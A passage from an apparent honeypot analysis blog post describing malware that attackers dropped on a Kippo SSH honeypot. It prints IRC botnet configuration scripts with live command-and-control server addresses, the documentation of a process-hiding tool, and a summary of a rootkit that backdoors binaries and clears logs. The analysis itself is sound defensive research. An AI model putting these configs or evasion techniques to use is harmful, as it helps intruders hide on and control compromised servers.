<h2>File&nbsp;http___www_freewebs_com_iulianshooter_psyBNC2_3_2_4.tgz.tar.gz</h2>
<p>This is <a href="http://www.psybnc.at/about.html">PsyBNC</a>:</p>
<blockquote>
<p>psyBNC is an easy-to-use, multi-user, permanent <span class="caps">IRC</span>-Bouncer with many features. Some of its features include symmetric ciphering of talk and connections (Blowfish and <span class="caps">IDEA</span>), the possibility of linking multiple bouncers to an internal network including a shared partyline, vhost- and relay support to connected bouncers and an extensive online help system. Many other helpful functions are included. It compiles on Linux, FreeBSD, SunOs and&nbsp;Solaris.</p>
</blockquote>
<h2>File&nbsp;http___eu_ro_ca_img.tar</h2>
<p>Another package containing <code>pscan</code>. There&#8217;s also an <span class="caps">IRC</span> bot&nbsp;present:</p>
<div class="highlight"><pre><span></span><span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">SERVER 82.196.213.250 6666</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">SERVER 208.83.20.130 6667</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">SERVER 195.197.175.21 6669</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>

<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">ENTITY $2</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>

<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">### BOT 1 ###</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">NICK ${denomination[$((RANDOM%num_denominations))]}</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">USERFILE $2.user</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">CMDCHAR .</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">LOGIN ${denomination[$((RANDOM%num_denominations))]}</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">IRCNAME ${denomination[$((RANDOM%num_denominations))]}</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">MODES +iwsx</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">HASONOTICE</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">VIRTUAL $2</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">TOG CC          1</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">TOG CLOAK       1</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">TOG SPY         1</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">SET OPMODES     6</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">SET BANMODES    6</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">CHANNEL         #$1 </span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">TOG PUB         1</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">TOG MASS        1</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">TOG SHIT        1</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">TOG PROT        1</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">TOG ENFM        0</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">SET MKL         7</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">SET MBL         7</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
<span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">SET MPL         1</span><span class="s2">&quot;</span> <span class="o">&gt;&gt;</span> <span class="nv">m</span>.<span class="nv">set</span>
</pre></div>


<p>Looking at the intercepted logs (see above) reveals the used channels. Joining this channel leads you to an active community of rooters selling shells on hacked&nbsp;servers.</p>
<h2>File&nbsp;http___freewebtown_com_pacalici_lib.tgz</h2>
<p>Again an <span class="caps">IRC</span> bot, together with a shell script checking if the bot is running called <code>y2kupdate</code> (nice try). There&#8217;s also source code for a hider&nbsp;program:</p>
<div class="highlight"><pre><span></span>/*

<span class="n">psf</span> -- <span class="n">Process</span> <span class="n">Stack</span> <span class="n">Faker</span> (<span class="n">a</span>.<span class="n">k</span>.<span class="n">a</span>. <span class="n">Fucker</span>)

<span class="n">Coded</span> <span class="nb">by</span> <span class="n">Stas</span>; (<span class="n">C</span>)<span class="n">opyLeft</span> <span class="nb">by</span> <span class="n">SysD</span> <span class="n">Destructive</span> <span class="n">Labs</span>, <span class="mi">1997</span><span class="o">-</span><span class="mi">2003</span>

<span class="n">Tested</span> <span class="n">on:</span> <span class="n">FreeBSD</span> <span class="mf">4.3</span>, <span class="n">Linux</span> <span class="mf">2.4</span>, <span class="n">NetBSD</span> <span class="mf">1.5</span>, <span class="n">Solaris</span> <span class="mf">2.7</span>

<span class="n">Compile</span> <span class="n">with:</span>

<span class="c1"># gcc -O2 -o h h.c</span>
<span class="c1"># strip h</span>

<span class="n">Did</span> <span class="n">you</span> <span class="n">ever</span> <span class="n">need</span> <span class="nb">to</span> *<span class="n">hide</span>* <span class="n">what</span> <span class="n">are</span> <span class="n">you</span> <span class="n">doing</span> <span class="n">on</span> <span class="n">somewhat</span> <span class="nb">like</span> <span class="n">public</span>
<span class="n">server</span>? <span class="n">Like</span> <span class="n">Quake</span> <span class="n">server</span> <span class="o">or</span> <span class="k">maybe</span> <span class="n">John</span> <span class="n">The</span> <span class="n">Ripper</span>? <span class="s">&#39;Cos when your admin</span>
<span class="s">run &quot;ps auwx&quot; or &quot;top&quot; and sees process like that, it&#39;</span><span class="o">s</span> <span class="n">probable</span> <span class="n">you&#39;ll</span>
<span class="n">loose</span> <span class="n">your</span> <span class="n">shell</span> <span class="n">on</span> <span class="n">that</span> <span class="n">server</span>. <span class="n">So</span>, <span class="n">what</span> <span class="nb">to</span> <span class="k">do</span>? <span class="n">Rootkit</span> <span class="k">is</span> <span class="n">a</span> <span class="n">good</span> <span class="n">solution</span>
<span class="k">but</span> <span class="n">you</span> <span class="n">need</span> <span class="n">root</span> <span class="n">privilegies</span> <span class="nb">to</span> <span class="n">install</span> <span class="n">it</span> <span class="o">and</span> <span class="n">it&#39;s</span> <span class="n">a</span> <span class="nb">bit</span> <span class="n">overkill</span> <span class="k">for</span>
<span class="n">running</span> <span class="n">an</span> <span class="n">inoffensive</span> <span class="n">eggdrop</span> <span class="n">bot</span> (<span class="n">belive</span> <span class="n">me</span>, <span class="n">I</span> <span class="n">saw</span> <span class="n">user</span> <span class="n">installing</span> <span class="n">rootkit</span>
<span class="n">just</span> <span class="nb">to</span> <span class="n">hide</span> <span class="n">eggdrop</span>!). <span class="n">Well</span>, <span class="n">this</span> <span class="n">little</span> <span class="n">proggie</span> <span class="nb">does</span> <span class="n">a</span> <span class="n">job</span> <span class="k">for</span> <span class="n">you</span>. <span class="n">It</span>
*<span class="k">will</span> <span class="nb">not</span>* <span class="n">erase</span> <span class="n">some</span> <span class="n">entry</span> <span class="n">you</span> <span class="n">wish</span> <span class="nb">to</span> <span class="n">hide</span> <span class="nb">from</span> <span class="n">process</span> <span class="n">stack</span>. <span class="n">It</span> <span class="n">just</span>
<span class="n">changes</span> <span class="n">a</span> <span class="n">commandline</span> <span class="k">for</span> <span class="s">&quot;ps&quot;</span> <span class="n">entry</span> ;)
<span class="n">This</span> <span class="n">principle</span> <span class="k">is</span> <span class="n">widely</span> <span class="n">used</span> <span class="n">in</span> <span class="n">many</span> <span class="n">security-related</span> <span class="n">programs</span>. <span class="n">Nmap</span> <span class="n">was</span>
<span class="n">the</span> <span class="nb">first</span> <span class="n">I</span> <span class="n">saw</span>. <span class="n">How</span> <span class="nb">does</span> <span class="n">this</span> <span class="n">technique</span> <span class="n">works</span>? <span class="n">Take</span> <span class="n">a</span> <span class="n">look</span> <span class="n">at</span> <span class="n">execv</span>(<span class="mi">3</span>)
<span class="n">system</span> <span class="n">call:</span>

<span class="nb">int</span> <span class="n">execv</span>( <span class="n">const</span> <span class="n">char</span> *<span class="n">path</span>, <span class="n">char</span> *<span class="n">const</span> <span class="n">argv</span>[]);

<span class="s">&#39;path&#39;</span> <span class="k">is</span> <span class="n">a</span> <span class="n">path</span> <span class="nb">to</span> <span class="n">executable</span> <span class="n">file</span>. <span class="n">And</span> <span class="s">&#39;argv&#39;</span> <span class="n">array</span> <span class="k">is</span>... <span class="n">Well</span>, <span class="n">it&#39;s</span>
<span class="n">just</span> <span class="n">the</span> <span class="n">same</span> <span class="s">&#39;argv&#39;</span> <span class="n">from:</span>

<span class="nb">int</span> <span class="n">main</span>(<span class="nb">int</span> <span class="n">argc</span>, <span class="n">char</span> *<span class="n">argv</span>[])

<span class="k">where</span> <span class="s">&#39;argv[0]&#39;</span> <span class="k">is</span> <span class="n">a</span> <span class="n">commandline</span> <span class="o">and</span> <span class="s">&#39;argv[1]&#39;</span> <span class="o">and</span> <span class="n">higher</span> <span class="n">are</span> <span class="n">paramenters</span>.
<span class="n">Normally</span> <span class="s">&#39;argv[0]&#39;</span> <span class="n">receives</span> <span class="n">the</span> <span class="n">same</span> <span class="nb">value</span> <span class="k">as</span> <span class="s">&#39;path&#39;</span> <span class="nb">from</span> <span class="n">execv</span>(<span class="mi">3</span>). <span class="n">But</span> <span class="n">you</span>
<span class="o">also</span> <span class="nb">can</span> <span class="k">use</span> <span class="n">other</span> <span class="nb">values</span>! <span class="n">For</span> <span class="n">example</span>, <span class="k">when</span> <span class="n">you</span> <span class="nb">run</span> <span class="n">Nmap</span>, <span class="n">it</span> <span class="nb">can</span> <span class="n">execv</span>(<span class="mi">3</span>)
<span class="n">itself</span> <span class="n">with</span> <span class="n">commandline</span> <span class="n">changed</span> <span class="nb">to</span> <span class="s">&#39;pine&#39;</span>. <span class="n">OK</span>, <span class="n">commandline</span> <span class="k">is</span> <span class="n">gone</span>. <span class="n">But</span> <span class="n">what</span>
<span class="nb">to</span> <span class="k">do</span> <span class="n">with</span> <span class="n">paramenters</span>? <span class="n">Nmap</span> <span class="n">uses</span> <span class="n">environment</span> <span class="nb">to</span> <span class="n">send</span> <span class="n">paramenters</span> <span class="n">user</span> <span class="n">passed</span>
<span class="nb">to</span> <span class="s">&#39;spoofed&#39;</span> <span class="n">process</span> <span class="o">and</span> <span class="n">ignores</span> <span class="n">other</span> <span class="n">paramenters</span>. <span class="n">If</span> <span class="n">you</span> <span class="n">wish</span> <span class="nb">to</span> <span class="n">spoof</span>
<span class="s">&#39;nmap -sS -vv -O -P0 -o lhost.log localhost&#39;</span> <span class="k">as</span> <span class="s">&#39;pine -i&#39;</span>, <span class="n">Nmap</span> <span class="s">&quot;remembers&quot;</span>
<span class="n">it&#39;s</span> <span class="n">specific</span> <span class="n">switches</span> <span class="o">and</span> <span class="n">re-execs</span> <span class="n">itself</span> <span class="k">as</span> <span class="s">&#39;pine&#39;</span> <span class="n">with</span> <span class="n">parameter</span> <span class="s">&#39;-i&#39;</span>.
<span class="n">Fine</span>! <span class="n">But</span> <span class="n">John</span> <span class="n">The</span> <span class="n">Ripper</span>, <span class="n">Quake</span> <span class="n">server</span> &amp; <span class="n">eggdrop</span> <span class="n">can&#39;t</span> <span class="n">fake</span> <span class="n">parameters</span> <span class="n">in</span>
<span class="n">this</span> <span class="n">way</span>!!! <span class="n">What&#39;s</span> <span class="n">the</span> <span class="n">other</span> <span class="n">way</span>? <span class="n">Sorry</span>, <span class="n">it&#39;s</span> *<span class="n">very</span>* <span class="n">dumb</span> <span class="o">and</span> *<span class="n">very</span>* <span class="n">ugly</span>...
<span class="n">What</span> <span class="n">happens</span> <span class="k">if</span> <span class="n">you</span> <span class="n">change</span> <span class="n">commandline</span> <span class="nb">to</span> <span class="n">something</span> <span class="n">like:</span>
<span class="s">&#39;pine -i                                            &#39;</span>

(<span class="n">Ya</span>, <span class="s">&#39;pine -i&#39;</span> <span class="n">plus</span> <span class="n">many</span> <span class="n">space</span> <span class="n">characters</span> <span class="mh">0x20</span>)? <span class="n">Hahah</span>, <span class="s">&quot;ps&quot;</span>, <span class="s">&quot;top&quot;</span> &amp; <span class="n">many</span>
<span class="n">other</span> <span class="n">monitors</span> <span class="n">just</span> <span class="nb">shift</span> <span class="n">away</span> *<span class="n">real</span>* <span class="n">parameters</span>! <span class="n">So</span>, <span class="n">you</span> <span class="n">don&#39;t</span> <span class="n">hide</span> <span class="n">them</span>,
<span class="n">just</span> <span class="nb">shift</span> <span class="n">away</span> <span class="nb">from</span> <span class="n">screen</span>. <span class="n">Such</span> <span class="n">a</span> <span class="s">&quot;algorithm&quot;</span> <span class="n">doesn&#39;t</span> <span class="n">needs</span> <span class="n">neither</span> <span class="n">rootkits</span>,
<span class="n">neither</span> <span class="n">special</span> <span class="n">privilegies</span>! <span class="nb">Any</span> <span class="n">user</span> <span class="nb">can</span> <span class="k">do</span> <span class="n">that</span> <span class="n">at</span> <span class="nb">any</span> <span class="nb">time</span>!!! *<span class="n">That&#39;s</span>* <span class="s">&quot;psf&quot;</span>
<span class="nb">does</span>. <span class="n">Try</span> <span class="n">this:</span>

<span class="c1"># psf -s &quot;pine -i&quot; sleep 30 &amp;</span>
[<span class="mi">1</span>] <span class="mi">440</span>

<span class="c1"># ps auwx</span>
...
<span class="n">stas</span>        <span class="mi">84</span>  <span class="mf">0.0</span>  <span class="mf">0.6</span>  <span class="mi">2012</span> <span class="mi">1232</span> <span class="n">pts</span><span class="o">/</span><span class="mi">0</span>    <span class="n">S</span>    <span class="mi">19</span>:<span class="mi">12</span>   <span class="mi">0</span>:<span class="mo">00</span> <span class="n">bash</span> -<span class="n">rcfile</span> .<span class="n">bashrc</span>
<span class="n">stas</span>       <span class="mi">440</span>  <span class="mf">0.0</span>  <span class="mf">0.1</span>  <span class="mi">1204</span>  <span class="mi">376</span> <span class="n">tty2</span>     <span class="n">S</span>    <span class="mi">20</span>:<span class="mi">09</span>   <span class="mi">0</span>:<span class="mo">00</span> <span class="n">pine</span> -<span class="n">i</span>
<span class="n">stas</span>       <span class="mi">450</span>  <span class="mf">0.0</span>  <span class="mf">0.4</span>  <span class="mi">2544</span>  <span class="mi">816</span> <span class="n">tty2</span>     <span class="n">R</span>    <span class="mi">20</span>:<span class="mi">12</span>   <span class="mi">0</span>:<span class="mo">00</span> <span class="n">ps</span> <span class="n">auwx</span>
...

<span class="n">Hahahaah</span>, <span class="n">that&#39;s</span> <span class="n">what</span> <span class="n">we</span> <span class="n">need</span>! <span class="n">Please</span> <span class="n">note</span> <span class="n">that</span> <span class="n">commandline</span> <span class="n">change</span> <span class="n">isn&#39;t</span>
<span class="n">immediate</span>, <span class="n">just</span> <span class="nb">wait</span> <span class="n">a</span> <span class="n">little</span> <span class="o">before</span> <span class="n">it</span> <span class="n">completes</span>. <span class="n">But</span>... <span class="n">Did</span> <span class="n">you</span> <span class="n">noticed</span>
<span class="n">a</span> <span class="n">white</span> <span class="n">line</span> <span class="n">between</span> <span class="n">processes</span> <span class="mi">440</span> &amp; <span class="mi">450</span>? <span class="n">Uhm</span>, <span class="n">that&#39;s</span> <span class="k">our</span> <span class="s">&quot;shift buffer&quot;</span>.
<span class="n">Pray</span> <span class="k">for</span> <span class="n">your</span> <span class="n">admin</span> <span class="n">don&#39;t</span> <span class="n">notice</span> <span class="n">that</span>! <span class="n">Anyway</span>, <span class="n">they</span> <span class="n">are</span> <span class="n">many</span> <span class="n">more</span> <span class="n">problems</span>
<span class="n">with</span> <span class="n">parameter</span> <span class="n">shifting</span>. <span class="s">&quot;top&quot;</span> <span class="n">program</span>, <span class="k">for</span> <span class="n">example</span>, <span class="n">shows</span> <span class="s">&quot;command names&quot;</span>
<span class="n">instead</span> <span class="k">of</span> <span class="s">&quot;command lines&quot;</span> <span class="nb">by</span> <span class="k">default</span>. <span class="n">You</span> <span class="n">see</span> <span class="n">a</span> <span class="n">file</span> <span class="nb">name</span> <span class="n">instead</span> <span class="k">of</span>
<span class="s">&#39;argv[0]&#39;</span> <span class="nb">value</span>. <span class="s">&quot;psf&quot;</span> <span class="n">tries</span> <span class="nb">to</span> <span class="n">fix</span> <span class="n">that</span> <span class="n">creating</span> <span class="nb">symlink</span> <span class="n">with</span> <span class="nb">name</span> <span class="k">of</span>
<span class="n">faked</span> <span class="n">commandline</span> <span class="nb">to</span> <span class="n">real</span> <span class="n">program</span> (<span class="n">on</span> <span class="n">previous</span> <span class="n">example</span>, <span class="n">it</span> <span class="n">creates</span> <span class="nb">symlink</span>
/<span class="n">tmp</span>/.<span class="n">psf-xxxx</span><span class="o">/</span><span class="n">pine</span> =&gt; /<span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="nb">sleep</span>). <span class="n">Note</span> <span class="n">that</span> <span class="n">it</span> <span class="n">doesn&#39;t</span> <span class="n">works</span> <span class="n">on</span> *<span class="n">BSD</span>
<span class="n">systems</span> (*<span class="n">BSD</span> <span class="n">kernel</span> (?) <span class="n">follows</span> <span class="nb">symlink</span> <span class="o">and</span> <span class="n">shows</span> <span class="n">real</span> <span class="n">filename</span> <span class="n">anyway</span>).
<span class="n">The</span> <span class="n">ways</span> <span class="nb">to</span> <span class="n">discover</span> <span class="n">faked</span> <span class="n">processes</span> <span class="n">I</span> <span class="n">know</span> <span class="n">are:</span>

 * <span class="n">kidding</span> <span class="n">with</span> <span class="n">top</span>(<span class="mi">1</span>)
 * <span class="n">ps</span> <span class="n">auwx</span> --<span class="n">cols</span> <span class="mi">1024</span>
 * <span class="nb">cat</span> /<span class="n">proc</span>/[<span class="n">pidn</span>]/<span class="n">cmdline</span> (<span class="n">Linux</span> <span class="k">only</span>)
 * <span class="n">whatever</span> <span class="n">non-standart</span> <span class="n">process</span> <span class="n">stack</span> <span class="n">monitors</span>
 * <span class="n">looking</span> <span class="nb">open</span> <span class="n">files</span> <span class="n">with</span> <span class="s">&quot;lsof&quot;</span> <span class="n">program</span>
 * <span class="k">if</span> <span class="n">you</span> <span class="k">use</span> -<span class="n">d</span> (<span class="n">daemonize</span>) <span class="n">option</span>, <span class="n">be</span> <span class="n">careful</span>!!! <span class="n">As</span> <span class="nb">any</span> <span class="n">cool</span> <span class="n">daemon</span> <span class="n">should</span>
   <span class="k">do</span>, <span class="s">&quot;psf&quot;</span> <span class="n">closes</span> <span class="n">std</span>(<span class="n">in</span>,<span class="n">out</span>,<span class="n">err</span>). <span class="n">What</span> <span class="n">your</span> <span class="n">admin</span> <span class="k">will</span> <span class="n">think</span> <span class="k">if</span> <span class="n">he</span> (<span class="n">she</span>)
   <span class="n">sees</span> <span class="s">&quot;pine -i&quot;</span> <span class="n">with</span> <span class="n">no</span> <span class="n">parent</span> <span class="o">and</span> <span class="n">neither</span> <span class="n">allocated</span> <span class="n">TTY</span>?!

<span class="n">Too</span> <span class="n">many</span>, <span class="n">don&#39;t</span> <span class="n">you</span> <span class="n">think</span>? <span class="n">So</span>, <span class="n">what&#39;s</span> *<span class="n">THE</span> <span class="n">BEST</span>* <span class="n">way</span> <span class="nb">to</span> <span class="n">hide</span> <span class="n">processes</span>?
<span class="n">Rootkit</span> <span class="n">sounds</span> <span class="n">well</span>, <span class="k">but</span> <span class="n">it&#39;s</span> <span class="n">a</span> <span class="nb">bit</span> <span class="nb">complex</span> <span class="nb">to</span> <span class="k">use</span>, <span class="n">you</span> <span class="n">know</span>... <span class="n">So</span>, <span class="n">IMHO</span>,
<span class="n">you</span> <span class="n">must</span> <span class="n">get</span> <span class="n">source</span> <span class="k">of</span> <span class="n">program</span> <span class="n">you</span> <span class="n">wish</span> <span class="nb">to</span> <span class="n">hide</span> <span class="o">and</span> <span class="n">hardcode</span> <span class="nb">all</span> <span class="n">parameters</span>
<span class="n">inside</span> <span class="n">executable</span>... <span class="n">After</span> <span class="n">that</span>, <span class="n">rename</span> <span class="n">it</span> <span class="n">in</span> <span class="n">whatever</span> <span class="o">and</span> <span class="k">let</span> <span class="n">it</span> <span class="n">go</span>!
<span class="n">Of</span> <span class="n">course</span> <span class="n">you</span> <span class="n">must</span> <span class="n">program</span> <span class="n">at</span> <span class="n">least</span> <span class="n">C</span><span class="o">/</span><span class="n">C</span>++ <span class="nb">to</span> <span class="k">do</span> <span class="n">such</span> <span class="n">a</span> <span class="n">trick</span>. <span class="n">Now</span>, <span class="k">if</span>
<span class="n">you&#39;re</span> <span class="n">glad</span> <span class="n">with</span> <span class="k">my</span> <span class="n">quick</span> &amp; <span class="n">dirty</span> <span class="n">solution</span> <span class="n">called</span> <span class="s">&quot;psf&quot;</span>, <span class="n">happy</span> <span class="n">faking</span>!!!
*/
</pre></div>


<p>Deviously simple. Adding spaces. There&#8217;s also a configuration file present leading to a lonely <span class="caps">IRC</span>&nbsp;server:</p>
<div class="highlight"><pre><span></span><span class="n">NICK</span>          <span class="n">Sex</span>
<span class="n">USERFILE</span>      <span class="mi">1</span>
<span class="n">CMDCHAR</span>       <span class="o">!</span>
<span class="n">LOGIN</span>          <span class="n">tun</span>
<span class="n">IRCNAME</span>       <span class="n">Nelu</span>
<span class="n">MODES</span>         <span class="o">+</span><span class="n">ix</span><span class="o">-</span><span class="n">ws</span>
<span class="n">TOG</span> <span class="n">CC</span>        <span class="mi">0</span>
<span class="n">TOG</span> <span class="n">CLOAK</span>     <span class="mi">1</span>
<span class="n">TOG</span> <span class="n">SPY</span>       <span class="mi">1</span>
<span class="k">SET</span> <span class="n">OPMODES</span>   <span class="mi">4</span>
<span class="k">SET</span> <span class="n">BANMODES</span>  <span class="mi">6</span>
<span class="k">SET</span> <span class="n">AAWAY</span>     <span class="mi">1</span>
<span class="n">TOG</span> <span class="n">NOIDLE</span>    <span class="mi">1</span>

<span class="n">CHANNEL</span>       <span class="o">#</span><span class="n">brasov</span>
<span class="n">TOG</span> <span class="n">PUB</span>       <span class="mi">1</span>
<span class="n">TOG</span> <span class="n">MASS</span>      <span class="mi">1</span>
<span class="n">TOG</span> <span class="n">SHIT</span>      <span class="mi">1</span>
<span class="n">TOG</span> <span class="n">PROT</span>      <span class="mi">1</span>
<span class="n">TOG</span> <span class="n">ENFM</span>      <span class="mi">1</span>
<span class="k">SET</span> <span class="n">ENFM</span>      <span class="o">+</span><span class="n">nt</span>
<span class="k">SET</span> <span class="n">MDL</span>       <span class="mi">4</span>
<span class="k">SET</span> <span class="n">MKL</span>       <span class="mi">4</span>
<span class="k">SET</span> <span class="n">MBL</span>       <span class="mi">4</span>
<span class="k">SET</span> <span class="n">MPL</span>       <span class="mi">1</span>


<span class="n">SERVER</span> <span class="mi">200</span><span class="p">.</span><span class="mi">41</span><span class="p">.</span><span class="mi">53</span><span class="p">.</span><span class="mi">1</span> <span class="mi">6667</span>
<span class="n">SERVER</span> <span class="n">chmod</span><span class="p">.</span><span class="n">myftp</span><span class="p">.</span><span class="n">biz</span> <span class="mi">6667</span>
</pre></div>


<p>Joining the channel also reveals a small hacker community using EnergyMechs on hacked servers to DoS Russion web&nbsp;hosts.</p>
<h2>File&nbsp;http___ema_ucoz_com_ICE_UNIX.tgz</h2>
<p>Again a <span class="caps">IRC</span> bot leading to an obscure channel on Undernet. I have not repeated the config&nbsp;here.</p>
<h2>Archive containing&nbsp;.sshd</h2>
<p>A more unique malware script this time. Containing the <code>shv5-rootkit</code> rootkit, which is, according to the file, &#8220;very private&#8221;, but dates back to 2007, so it&#8217;s probably an old version. The tools first checks for Tripwire, Snort, and other tools. It then continues to install itself into various directories. And starts to install backdoors into various programs (<code>ls</code>, <code>top</code>, &#8230;). It then checks for some basic vulnerable daemons, and warns that you should patch them (oh the irony). It finally also checks for other rootkits (tk7, tk8, beX2, tuxkit, optickit) and tries to remove those. It then tries to cover its tracks by clearing log&nbsp;files.</p>
<p>The other files also mostly contained bots pointing to Undernet <span class="caps">IRC</span> channels. Some or quite active and contain around 100 bots, others are empty. Joining some of them gets you an immediate&nbsp;ban.</p>
<h1>Country&nbsp;statistics</h1>
<p>I grepped through hundreds of lines of logging from Kippo, removed duplicate <span class="caps">IP</span> addresses, and used GeoIP to do a country lookup. Here are the sorted&nbsp;results:</p>
<div class="highlight"><pre><span></span><span class="n">CN</span><span class="p">,</span> <span class="n">China</span>                <span class="mi">51</span>
<span class="n">US</span><span class="p">,</span> <span class="n">United</span> <span class="n">States</span>        <span class="mi">42</span>
<span class="n">RO</span><span class="p">,</span> <span class="n">Romania</span>              <span class="mi">26</span>
<span class="n">CA</span><span class="p">,</span> <span class="n">Canada</span>               <span class="mi">12</span>
<span class="k">IN</span><span class="p">,</span> <span class="n">India</span>                <span class="mi">11</span>
<span class="n">KR</span><span class="p">,</span> <span class="n">Korea</span><span class="p">,</span> <span class="n">Republic</span> <span class="k">of</span>   <span class="mi">10</span>
<span class="n">RU</span><span class="p">,</span> <span class="n">Russian</span> <span class="n">Federation</span>   <span class="mi">10</span>
<span class="n">BR</span><span class="p">,</span> <span class="n">Brazil</span>                <span class="mi">8</span>
<span class="n">DE</span><span class="p">,</span> <span class="n">Germany</span>               <span class="mi">8</span>
<span class="n">GB</span><span class="p">,</span> <span class="n">United</span> <span class="n">Kingdom</span>        <span class="mi">8</span>
<span class="n">TH</span><span class="p">,</span> <span class="n">Thailand</span>              <span class="mi">8</span>
<span class="n">IT</span><span class="p">,</span> <span class="n">Italy</span>                 <span class="mi">7</span>
<span class="n">HK</span><span class="p">,</span> <span class="n">Hong</span> <span class="n">Kong</span>             <span class="mi">6</span>
<span class="n">JP</span><span class="p">,</span> <span class="n">Japan</span>                 <span class="mi">5</span>
<span class="n">TR</span><span class="p">,</span> <span class="n">Turkey</span>                <span class="mi">5</span>
<span class="k">AT</span><span class="p">,</span> <span class="n">Austria</span>               <span class="mi">4</span>
<span class="n">TW</span><span class="p">,</span> <span class="n">Taiwan</span>                <span class="mi">4</span>
<span class="n">BE</span><span class="p">,</span> <span class="n">Belgium</span>               <span class="mi">3</span>
<span class="n">CO</span><span class="p">,</span> <span class="n">Colombia</span>              <span class="mi">3</span>
<span class="n">ES</span><span class="p">,</span> <span class="n">Spain</span>                 <span class="mi">3</span>
<span class="n">FR</span><span class="p">,</span> <span class="n">France</span>                <span class="mi">3</span>
<span class="n">NL</span><span class="p">,</span> <span class="n">Netherlands</span>           <span class="mi">3</span>
<span class="n">SE</span><span class="p">,</span> <span class="n">Sweden</span>                <span class="mi">3</span>
<span class="n">CZ</span><span class="p">,</span> <span class="n">Czech</span> <span class="n">Republic</span>        <span class="mi">2</span>
<span class="n">EG</span><span class="p">,</span> <span class="n">Egypt</span>                 <span class="mi">2</span>
<span class="n">ID</span><span class="p">,</span> <span class="n">Indonesia</span>             <span class="mi">2</span>
<span class="n">MD</span><span class="p">,</span> <span class="n">Moldova</span><span class="p">,</span> <span class="n">Republic</span> <span class="k">of</span>  <span class="mi">2</span>
<span class="k">NO</span><span class="p">,</span> <span class="n">Norway</span>                <span class="mi">2</span>
<span class="n">PL</span><span class="p">,</span> <span class="n">Poland</span>                <span class="mi">2</span>
<span class="n">VN</span><span class="p">,</span> <span class="n">Vietnam</span>               <span class="mi">2</span>
<span class="n">AE</span><span class="p">,</span> <span class="n">United</span> <span class="n">Arab</span> <span class="n">Emirates</span>  <span class="mi">1</span>
<span class="n">AR</span><span class="p">,</span> <span class="n">Argentina</span>             <span class="mi">1</span>
<span class="n">BG</span><span class="p">,</span> <span class="n">Bulgaria</span>              <span class="mi">1</span>
